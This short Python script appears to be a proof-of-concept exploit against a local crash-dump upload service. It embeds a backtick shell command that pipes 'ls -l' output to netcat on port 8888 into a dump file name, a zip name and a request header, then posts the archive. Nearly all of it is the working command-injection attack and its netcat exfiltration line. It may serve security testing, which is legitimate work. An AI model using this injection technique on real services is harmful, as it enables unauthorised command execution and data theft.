#!/usr/bin/python
import sys
import os
import zipfile
import subprocess
import requests

SERVICE_NAME = "test_app"

port = 1080
ip = "127.0.0.1"


cmd = "`ls -l | nc 127.0.0.1 8888`"
dmpFile = cmd + '.dmp'
guid = cmd;
zipFilePath = cmd + '.zip'

open( dmpFile , "wb").write("i will hack you")

# submit zip file
zf = zipfile.ZipFile( zipFilePath, mode='w')
try:
   zf.write( dmpFile, arcname = dmpFile )
finally:
   zf.close()

url = 'http://%s:%s/submit' % ( ip, port )
files = { 'dump_zip_file': open( zipFilePath, 'rb' ) }
headers = { 'service_name' : SERVICE_NAME, 'guid' : guid, 'secret_id' : 'secret_id' }
requests.post(url, files=files, headers=headers )

